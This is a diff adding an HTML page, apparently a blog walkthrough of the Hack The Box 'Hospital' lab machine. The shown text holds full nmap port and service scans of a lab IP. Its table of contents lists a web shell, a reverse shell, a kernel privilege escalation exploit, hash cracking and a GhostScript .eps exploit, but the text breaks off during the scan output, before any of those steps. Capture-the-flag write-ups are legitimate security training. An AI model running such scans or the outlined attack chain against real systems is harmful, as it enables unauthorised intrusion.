@@ -1,0 +1,2425 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <meta name="generator" content="Hugo 0.135.0">
+
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Saucy Monk" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            Hospital HTB Walkthrough |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.e6eadce601966e1bc2d798a6a4b94edc31360559ec0c7efd94e31d855914e918a88c9bddfabc11200357a22ce33ebdfd27c70fdd76cc8d155e9633bab42e0f76.css"
+                integrity="sha512-5urc5gGWbhvC15impLlO3DE2BVnsDH79lOMdhVkU6RiojJvd&#43;rwRIANXoizjPr39J8cP3XbMjRVeljO6tC4Pdg==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.c36845ad92ed66ad12c3fe7d5317167c3eab3361616252a52d1758063294d08a7ac6d218fdcd516973c7a9a66faf3ee9c3dec654a17dddda4444675e53e62785.css"
+                integrity="sha512-w2hFrZLtZq0Sw/59UxcWfD6rM2FhYlKlLRdYBjKU0Ip6xtIY/c1RaXPHqaZvrz7pw97GVKF93dpERGdeU&#43;YnhQ==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            Hospital HTB Walkthrough -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir opened-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Box Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                Hospital HTB Walkthrough
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="0001.01.01"
+                            >0001.01.01
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        22 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+                <div class="tags">
+                    <i
+                        class="bi bi-tags"
+                        title="Tags"></i>
+                    
+                        <a
+                            href="/tags/box/"
+                            class="tag-btn">
+                            Box
+                        </a>
+                    
+                        <a
+                            href="/tags/htb/"
+                            class="tag-btn">
+                            HTB
+                        </a>
+                    
+                        <a
+                            href="/tags/medium/"
+                            class="tag-btn">
+                            Medium
+                        </a>
+                    
+                        <a
+                            href="/tags/windows/"
+                            class="tag-btn">
+                            Windows
+                        </a>
+                    
+                        <a
+                            href="/tags/ldap/"
+                            class="tag-btn">
+                            LDAP
+                        </a>
+                    
+                        <a
+                            href="/tags/ghostscript/"
+                            class="tag-btn">
+                            GhostScript
+                        </a>
+                    
+                        <a
+                            href="/tags/selenium/"
+                            class="tag-btn">
+                            Selenium
+                        </a>
+                    
+                        <a
+                            href="/tags/roundcube/"
+                            class="tag-btn">
+                            RoundCube
+                        </a>
+                    
+                </div>
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/walkthroughs/" class="bread-btn">
+    
+
+    
+        Walkthroughs
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/walkthroughs/hospital-box/" class="bread-btn">
+    
+
+    
+        
+            Hospital HTB Walkthrough
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#hospital-hack-the-box-walkthrough-writeup">Hospital Hack The Box Walkthrough/Writeup:</a></li>
+    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
+      <ul>
+        <li><a href="#nmap">NMAP:</a></li>
+        <li><a href="#ldap-389">LDAP <code>389</code>:</a></li>
+        <li><a href="#smb-445">SMB <code>445</code>:</a></li>
+        <li><a href="#dns-53">DNS <code>53</code>:</a></li>
+        <li><a href="#ssh-22">SSH <code>22</code>:</a></li>
+        <li><a href="#https-443">HTTPS <code>443</code>:</a></li>
+        <li><a href="#http-proxy-8080">HTTP-PROXY <code>8080</code>:</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-dot-foothold">2. Foothold:</a>
+      <ul>
+        <li><a href="#using-weevley-to-get-a-web-shell">Using Weevley To Get A Web Shell:</a></li>
+        <li><a href="#getting-around-the-timeout-using-weevely-s-build-in-reverse-shell">Getting around the timeout Using Weevely&rsquo;s build in reverse shell:</a></li>
+        <li><a href="#finding-mysql-creds-in-config-dot-php">Finding Mysql Creds in <code>config.php</code>:</a></li>
+        <li><a href="#understanding-the-upload-mechansim">Understanding the Upload Mechansim:</a></li>
+        <li><a href="#trying-to-connect-to-the-mysql-instance">Trying to connect to the mysql instance:</a></li>
+        <li><a href="#discovering-another-user">Discovering another User:</a></li>
+        <li><a href="#discovering-a-tmux-session">Discovering a Tmux Session:</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-dot-vm-privilege-escalation">3. VM Privilege Escalation:</a>
+      <ul>
+        <li><a href="#discovering-the-kernel-is-vulnerable-to-exploitation">Discovering the Kernel is vulnerable to exploitation:</a></li>
+        <li><a href="#building-the-and-transferring-the-exploit">Building the &amp; transferring the exploit:</a></li>
+        <li><a href="#using-the-cve-2023-35001-exploit-to-privesc-to-root">Using the CVE-2023-35001 exploit to privesc to root:</a></li>
+        <li><a href="#enumerating-as-root">Enumerating as Root:</a></li>
+        <li><a href="#connecting-to-the-mysql-instance-as-root">Connecting to the mysql instance as root!</a></li>
+        <li><a href="#cracking-the-hashes-admin-hash">Cracking the hashes admin hash:</a></li>
+        <li><a href="#dumping-shadow-hashes">Dumping Shadow Hashes:</a></li>
+        <li><a href="#cracking-dr-williams-hashed-password">Cracking Dr Williams Hashed Password:</a></li>
+        <li><a href="#accessing-dr-williams-email">Accessing Dr Williams Email:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-host-foothold">4. Host Foothold:</a>
+      <ul>
+        <li><a href="#gaining-access-to-the-host-via-malicious-dot-eps-ghostscript-exploit">Gaining Access to the host via Malicious <code>.eps</code> GhostScript Exploit:</a></li>
+        <li><a href="#finding-hard-coded-creds-in-ghostscript-dot-bat-file">Finding Hard-Coded Creds In <code>ghostscript.bat</code> file:</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-dot-privilege-escalation">3. Privilege Escalation:</a>
+      <ul>
+        <li><a href="#connecting-via-rdp-to-the-target">Connecting Via RDP to the target:</a></li>
+        <li><a href="#capturing-credentials-from-the-selenium-webdriver">Capturing Credentials from the Selenium WebDriver:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-ownership">4. Ownership:</a></li>
+    <li><a href="#lessons-learned">Lessons Learned:</a>
+      <ul>
+        <li><a href="#what-did-i-learn">What did I learn?</a></li>
+        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
+      </ul>
+    </li>
+    <li><a href="#sign-off">Sign off:</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="hospital-hack-the-box-walkthrough-writeup">Hospital Hack The Box Walkthrough/Writeup:</h2>
+<ul>
+<li><a href="https://app.hackthebox.com/machines/Hospital">https://app.hackthebox.com/machines/Hospital</a></li>
+</ul>
+<h2 id="1-dot-enumeration">1. Enumeration:</h2>
+<h3 id="nmap">NMAP:</h3>
+<ul>
+<li>
+<p><strong>Basic Scan</strong>:</p>
+<ul>
+<li><code>nmap $box -Pn -oA basicScan</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20kali%20in%2046-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%20%20%ef%95%99%2007:14:24%20zsh%20%e2%9d%af%20nmap%20$box%20-Pn%20-oA%20basicScan%0a%20%20Starting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-09-30%2007:14%20BST%0a%20%20Nmap%20scan%20report%20for%2010.129.229.189%0a%20%20Host%20is%20up%20%280.042s%20latency%29.%0a%20%20Not%20shown:%20980%20filtered%20tcp%20ports%20%28no-response%29%0a%20%20PORT%20%20%20%20%20STATE%20SERVICE%0a%20%2022/tcp%20%20%20open%20%20ssh%0a%20%2053/tcp%20%20%20open%20%20domain%0a%20%2088/tcp%20%20%20open%20%20kerberos-sec%0a%20%20135/tcp%20%20open%20%20msrpc%0a%20%20139/tcp%20%20open%20%20netbios-ssn%0a%20%20389/tcp%20%20open%20%20ldap%0a%20%20443/tcp%20%20open%20%20https%0a%20%20445/tcp%20%20open%20%20microsoft-ds%0a%20%20464/tcp%20%20open%20%20kpasswd5%0a%20%20593/tcp%20%20open%20%20http-rpc-epmap%0a%20%20636/tcp%20%20open%20%20ldapssl%0a%20%201801/tcp%20open%20%20msmq%0a%20%202103/tcp%20open%20%20zephyr-clt%0a%20%202105/tcp%20open%20%20eklogin%0a%20%202107/tcp%20open%20%20msmq-mgmt%0a%20%202179/tcp%20open%20%20vmrdp%0a%20%203268/tcp%20open%20%20globalcatLDAP%0a%20%203269/tcp%20open%20%20globalcatLDAPssl%0a%20%203389/tcp%20open%20%20ms-wbt-server%0a%20%208080/tcp%20open%20%20http-proxy%0a%0a%20%20Nmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%2011.09%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  kali in 46-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>   07:14:24 zsh ❯ nmap $box -Pn -oA basicScan
+</span></span><span style="display:flex;"><span>  Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-09-30 07:14 BST
+</span></span><span style="display:flex;"><span>  Nmap scan report <span style="color:#66d9ef">for</span> 10.129.229.189
+</span></span><span style="display:flex;"><span>  Host is up <span style="color:#f92672">(</span>0.042s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  Not shown: <span style="color:#ae81ff">980</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>  22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>  53/tcp   open  domain
+</span></span><span style="display:flex;"><span>  88/tcp   open  kerberos-sec
+</span></span><span style="display:flex;"><span>  135/tcp  open  msrpc
+</span></span><span style="display:flex;"><span>  139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>  389/tcp  open  ldap
+</span></span><span style="display:flex;"><span>  443/tcp  open  https
+</span></span><span style="display:flex;"><span>  445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>  464/tcp  open  kpasswd5
+</span></span><span style="display:flex;"><span>  593/tcp  open  http-rpc-epmap
+</span></span><span style="display:flex;"><span>  636/tcp  open  ldapssl
+</span></span><span style="display:flex;"><span>  1801/tcp open  msmq
+</span></span><span style="display:flex;"><span>  2103/tcp open  zephyr-clt
+</span></span><span style="display:flex;"><span>  2105/tcp open  eklogin
+</span></span><span style="display:flex;"><span>  2107/tcp open  msmq-mgmt
+</span></span><span style="display:flex;"><span>  2179/tcp open  vmrdp
+</span></span><span style="display:flex;"><span>  3268/tcp open  globalcatLDAP
+</span></span><span style="display:flex;"><span>  3269/tcp open  globalcatLDAPssl
+</span></span><span style="display:flex;"><span>  3389/tcp open  ms-wbt-server
+</span></span><span style="display:flex;"><span>  8080/tcp open  http-proxy
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.09 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>We safely assume this is a Domain Controller as it&rsquo;s running several domain services, <code>LDAP</code>, <code>SMB</code>, <code>Kerberos</code> &amp; <code>DNS</code>.</li>
+<li>It&rsquo;s interesting to see that their is a proxy running on 8080</li>
+<li>I have never seen these services before so this should be interesting:
+<ul>
+<li><code>2103/tcp open  zephyr-clt</code>
+<ul>
+<li>Google tells me this is a old protocol used for IRC.</li>
+</ul>
+</li>
+<li><code>2105/tcp open  eklogin</code>
+<ul>
+<li>Some quick googling says this is Kerberos Encrypted login.</li>
+</ul>
+</li>
+<li><code>2179/tcp open  vmrdp</code>
+<ul>
+<li>This looks to be hyper-v&rsquo;s guest console!</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>There are lots of services we can glean information from here, ldap being the main one.</li>
+</ul>
+</li>
+<li>
+<p><strong>In depth scan</strong>:</p>
+<ul>
+<li><code>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20kali%20in%2046-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%20%20took%2011s%0a%20%20%ef%95%99%2007:14:39%20zsh%20%e2%9d%af%20sudo%20nmap%20-p-%20-sV%20-sC%20-O%20-Pn%20--disable-arp-ping%20$box%20-oA%20FullTCP%0a%20%20[sudo]%20password%20for%20kali:%0a%20%20Starting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-09-30%2007:15%20BST%0a%20%20Nmap%20scan%20report%20for%2010.129.229.189%0a%20%20Host%20is%20up%20%280.039s%20latency%29.%0a%20%20Not%20shown:%2065506%20filtered%20tcp%20ports%20%28no-response%29%0a%20%20PORT%20%20%20%20%20%20STATE%20SERVICE%20%20%20%20%20%20%20%20%20%20%20VERSION%0a%20%2022/tcp%20%20%20%20open%20%20ssh%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20OpenSSH%209.0p1%20Ubuntu%201ubuntu8.5%20%28Ubuntu%20Linux;%20protocol%202.0%29%0a%20%20%7c%20ssh-hostkey:%0a%20%20%7c%20%20%20256%20e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa%20%28ECDSA%29%0a%20%20%7c_%20%20256%2096:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca%20%28ED25519%29%0a%20%2053/tcp%20%20%20%20open%20%20domain%20%20%20%20%20%20%20%20%20%20%20%20Simple%20DNS%20Plus%0a%20%2088/tcp%20%20%20%20open%20%20kerberos-sec%20%20%20%20%20%20Microsoft%20Windows%20Kerberos%20%28server%20time:%202024-09-30%2013:18:20Z%29%0a%20%20135/tcp%20%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%20139/tcp%20%20%20open%20%20netbios-ssn%20%20%20%20%20%20%20Microsoft%20Windows%20netbios-ssn%0a%20%20389/tcp%20%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20hospital.htb0.,%20Site:%20Default-First-Site-Name%29%0a%20%20%7c%20ssl-cert:%20Subject:%20commonName=DC%0a%20%20%7c%20Subject%20Alternative%20Name:%20DNS:DC,%20DNS:DC.hospital.htb%0a%20%20%7c%20Not%20valid%20before:%202023-09-06T10:49:03%0a%20%20%7c_Not%20valid%20after:%20%202028-09-06T10:49:03%0a%20%20443/tcp%20%20%20open%20%20ssl/http%20%20%20%20%20%20%20%20%20%20Apache%20httpd%202.4.56%20%28%28Win64%29%20OpenSSL/1.1.1t%20PHP/8.0.28%29%0a%20%20%7c_http-title:%20Hospital%20Webmail%20::%20Welcome%20to%20Hospital%20Webmail%0a%20%20%7c_ssl-date:%20TLS%20randomness%20does%20not%20represent%20time%0a%20%20%7c_http-server-header:%20Apache/2.4.56%20%28Win64%29%20OpenSSL/1.1.1t%20PHP/8.0.28%0a%20%20%7c%20ssl-cert:%20Subject:%20commonName=localhost%0a%20%20%7c%20Not%20valid%20before:%202009-11-10T23:48:47%0a%20%20%7c_Not%20valid%20after:%20%202019-11-08T23:48:47%0a%20%20%7c%20tls-alpn:%0a%20%20%7c_%20%20http/1.1%0a%20%20445/tcp%20%20%20open%20%20microsoft-ds?%0a%20%20464/tcp%20%20%20open%20%20kpasswd5?%0a%20%20593/tcp%20%20%20open%20%20ncacn_http%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a%20%20636/tcp%20%20%20open%20%20ldapssl?%0a%20%20%7c%20ssl-cert:%20Subject:%20commonName=DC%0a%20%20%7c%20Subject%20Alternative%20Name:%20DNS:DC,%20DNS:DC.hospital.htb%0a%20%20%7c%20Not%20valid%20before:%202023-09-06T10:49:03%0a%20%20%7c_Not%20valid%20after:%20%202028-09-06T10:49:03%0a%20%201801/tcp%20%20open%20%20msmq?%0a%20%202103/tcp%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%202105/tcp%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%202107/tcp%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%202179/tcp%20%20open%20%20vmrdp?%0a%20%203268/tcp%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20hospital.htb0.,%20Site:%20Default-First-Site-Name%29%0a%20%20%7c%20ssl-cert:%20Subject:%20commonName=DC%0a%20%20%7c%20Subject%20Alternative%20Name:%20DNS:DC,%20DNS:DC.hospital.htb%0a%20%20%7c%20Not%20valid%20before:%202023-09-06T10:49:03%0a%20%20%7c_Not%20valid%20after:%20%202028-09-06T10:49:03%0a%20%203269/tcp%20%20open%20%20globalcatLDAPssl?%0a%20%20%7c%20ssl-cert:%20Subject:%20commonName=DC%0a%20%20%7c%20Subject%20Alternative%20Name:%20DNS:DC,%20DNS:DC.hospital.htb%0a%20%20%7c%20Not%20valid%20before:%202023-09-06T10:49:03%0a%20%20%7c_Not%20valid%20after:%20%202028-09-06T10:49:03%0a%20%203389/tcp%20%20open%20%20ms-wbt-server%20%20%20%20%20Microsoft%20Terminal%20Services%0a%20%20%7c%20rdp-ntlm-info:%0a%20%20%7c%20%20%20Target_Name:%20HOSPITAL%0a%20%20%7c%20%20%20NetBIOS_Domain_Name:%20HOSPITAL%0a%20%20%7c%20%20%20NetBIOS_Computer_Name:%20DC%0a%20%20%7c%20%20%20DNS_Domain_Name:%20hospital.htb%0a%20%20%7c%20%20%20DNS_Computer_Name:%20DC.hospital.htb%0a%20%20%7c%20%20%20DNS_Tree_Name:%20hospital.htb%0a%20%20%7c%20%20%20Product_Version:%2010.0.17763%0a%20%20%7c_%20%20System_Time:%202024-09-30T13:19:21&#43;00:00%0a%20%20%7c%20ssl-cert:%20Subject:%20commonName=DC.hospital.htb%0a%20%20%7c%20Not%20valid%20before:%202024-09-29T13:09:46%0a%20%20%7c_Not%20valid%20after:%20%202025-03-31T13:09:46%0a%20%205985/tcp%20%20open%20%20http%20%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20HTTPAPI%20httpd%202.0%20%28SSDP/UPnP%29%0a%20%20%7c_http-server-header:%20Microsoft-HTTPAPI/2.0%0a%20%20%7c_http-title:%20Not%20Found%0a%20%206404/tcp%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%206406/tcp%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%206407/tcp%20%20open%20%20ncacn_http%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a%20%206409/tcp%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%206615/tcp%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%206633/tcp%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%208080/tcp%20%20open%20%20http%20%20%20%20%20%20%20%20%20%20%20%20%20%20Apache%20httpd%202.4.55%20%28%28Ubuntu%29%29%0a%20%20%7c_http-open-proxy:%20Proxy%20might%20be%20redirecting%20requests%0a%20%20%7c%20http-title:%20Login%0a%20%20%7c_Requested%20resource%20was%20login.php%0a%20%20%7c%20http-cookie-flags:%0a%20%20%7c%20%20%20/:%0a%20%20%7c%20%20%20%20%20PHPSESSID:%0a%20%20%7c_%20%20%20%20%20%20httponly%20flag%20not%20set%0a%20%20%7c_http-server-header:%20Apache/2.4.55%20%28Ubuntu%29%0a%20%209389/tcp%20%20open%20%20mc-nmf%20%20%20%20%20%20%20%20%20%20%20%20.NET%20Message%20Framing%0a%20%2026327/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%20Warning:%20OSScan%20results%20may%20be%20unreliable%20because%20we%20could%20not%20find%20at%20least%201%20open%20and%201%20closed%20port%0a%20%20Device%20type:%20general%20purpose%0a%20%20Running%20%28JUST%20GUESSING%29:%20Linux%205.X%20%2891%25%29%0a%20%20OS%20CPE:%20cpe:/o:linux:linux_kernel:5.0%0a%20%20Aggressive%20OS%20guesses:%20Linux%205.0%20%2891%25%29%0a%20%20No%20exact%20OS%20matches%20for%20host%20%28test%20conditions%20non-ideal%29.%0a%20%20Service%20Info:%20Host:%20DC;%20OSs:%20Linux,%20Windows;%20CPE:%20cpe:/o:linux:linux_kernel,%20cpe:/o:microsoft:windows%0a%0a%20%20Host%20script%20results:%0a%20%20%7c_clock-skew:%20mean:%207h00m00s,%20deviation:%200s,%20median:%206h59m59s%0a%20%20%7c%20smb2-security-mode:%0a%20%20%7c%20%20%203:1:1:%0a%20%20%7c_%20%20%20%20Message%20signing%20enabled%20and%20required%0a%20%20%7c%20smb2-time:%0a%20%20%7c%20%20%20date:%202024-09-30T13:19:21%0a%20%20%7c_%20%20start_date:%20N/A%0a%0a%20%20OS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0a%20%20Nmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%20292.59%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  kali in 46-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh  took 11s
+</span></span><span style="display:flex;"><span>   07:14:39 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>  Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-09-30 07:15 BST
+</span></span><span style="display:flex;"><span>  Nmap scan report <span style="color:#66d9ef">for</span> 10.129.229.189
+</span></span><span style="display:flex;"><span>  Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  Not shown: <span style="color:#ae81ff">65506</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  PORT      STATE SERVICE           VERSION
+</span></span><span style="display:flex;"><span>  22/tcp    open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  | ssh-hostkey:
+</span></span><span style="display:flex;"><span>  |   <span style="color:#ae81ff">256</span> e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
